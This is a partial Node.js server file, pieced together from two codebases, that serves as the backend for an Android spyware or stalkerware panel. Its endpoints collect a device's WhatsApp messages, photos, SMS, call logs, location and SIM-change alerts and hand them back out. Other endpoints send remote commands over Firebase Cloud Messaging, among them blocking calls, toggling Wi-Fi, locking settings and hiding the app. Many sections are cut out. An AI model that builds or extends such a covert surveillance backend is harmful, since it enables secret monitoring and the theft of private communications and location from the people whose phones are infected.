...
const admin = require('firebase-admin'); // added from second code
...
// ==================== FIREBASE ADMIN INIT (from second code) ====================
try {
  admin.initializeApp({
...
// New stores from second code
let wifiData = {};
let mobileData = {};
let simAlertData = {};
let callInterceptData = {};
let settingsLockData = {};
let whatsappData = {};
let galleryData = {};

// ==================== WEBSOCKET (from first, with details) ====================
...
// ==================== KEEP‑ALIVE (aggressive – from first) ====================
...
// 4‑minute
setInterval(() => {
  const httpModule = RENDER_URL.startsWith('https') ? https : http;
  httpModule.get(`${RENDER_URL}/ping`, (res) => {
...
setInterval(() => {
  ...
  httpModule.get(`${RENDER_URL}/ping`, (res) => {
    ...
    setTimeout(() => {
      httpModule.get(`${RENDER_URL}/ping`, () => {
...
// ==================== NEW ENDPOINTS (from second code) ====================

// WhatsApp
app.post('/whatsapp', (req, res) => {
  const { device, messages } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  whatsappData[device] = { messages, count: messages?.length || 0, time: new Date() };
  res.json({ success: true });
});

app.get('/get-whatsapp', (req, res) => {
  const device = req.query.device;
  res.json(whatsappData[device] || { messages: [], count: 0 });
});

// Gallery
app.post('/gallery', (req, res) => {
  const { device, photos } = req.body;
  if (!device) return res.status(400).json({ error: 'Device required' });
  galleryData[device] = { photos, count: photos?.length || 0, time: new Date() };
  res.json({ success: true });
});

app.get('/get-gallery', (req, res) => {
  const device = req.query.device;
  res.json(galleryData[device] || { photos: [], count: 0 });
});
...
app.post('/wifi-status', (req, res) => {
  ...
  if (!device) return res.status(400).json({ error: 'Device required' });
  wifiData[device] = { enabled, ssid, ip, status, message, time };
  res.json({ success: true });
});

app.get('/toggle-wifi', async (req, res) => {
  const { device, enable } = req.query;
  if (!device) return res.status(400).json({ error: 'Device required' });
...
app.post('/data-status', (req, res) => {
  ...
  if (!device) return res.status(400).json({ error: 'Device required' });
  mobileData[device] = { enabled, operator, state, status, message, time };
  res.json({ success: true });
});
...
app.post('/sim-alert', (req, res) => {
  ...
  if (!device) return res.status(400).json({ error: 'Device required' });
  simAlertData[device] = { alert, new_imei, new_operator, time };
  res.json({ success: true });
});
...
app.post('/call-intercept', (req, res) => {
  ...
  if (!device) return res.status(400).json({ error: 'Device required' });
  callInterceptData[device] = { call_type, phone_number, state, status, message, time };
  res.json({ success: true });
});

app.get('/block-call', async (req, res) => {
  const { device, number } = req.query;
  if (!device) return res.status(400).json({ error: 'Device required' });
  await sendFCMSignal(device, 'block_call', { number });
  res.json({ success: true });
});
...
app.post('/settings-lock', (req, res) => {
  ...
  if (!device) return res.status(400).json({ error: 'Device required' });
  settingsLockData[device] = { settings_enabled, admin_active, status, message, time };
  res.json({ success: true });
});
...
// Show/Hide App (already added earlier in first, but keep both)
...
// GET DATA (from second)
app.get('/get-sms', (req, res) => {
  const device = req.query.device;
  res.json(smsList[device] || []);
});

app.get('/get-calls', (req, res) => {
  const device = req.query.device;
  res.json(callLogs[device] || []);
});

app.get('/get-location', (req, res) => {
  const device = req.query.device;
  res.json(locations[device] ? locations[device][0] || {} : {});
});

app.get('/device-data', (req, res) => {
  const device = req.query.device;
  res.json({
    battery: batteryData[device] || null,
    location: locations[device] ? locations[device][0] || null : null,
    sms: smsList[device] || [],
    calls: callLogs[device] || [],
    wifi: wifiData[device] || null,
    mobileData: mobileData[device] || null,
    whatsapp: whatsappData[device] || null,
    gallery: galleryData[device] || null
  });
});

// ==================== FCM SIGNAL (using Firebase Admin – from second) ====================
async function sendFCMSignal(deviceName, action, extra = {}) {
  try {
    const token = devices[deviceName]?.token;
    if (!token) return;
    ...
    console.log(`✅ FCM sent to ${deviceName}: ${action}`);
  } catch (error) {
    console.error(`❌ FCM error for ${deviceName}:`, error.message);
  }
}

// ==================== SIGNAL ROUTE (from first – uses WebSocket) ====================
...
// ==================== HTML DASHBOARD (from first – full) ====================
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
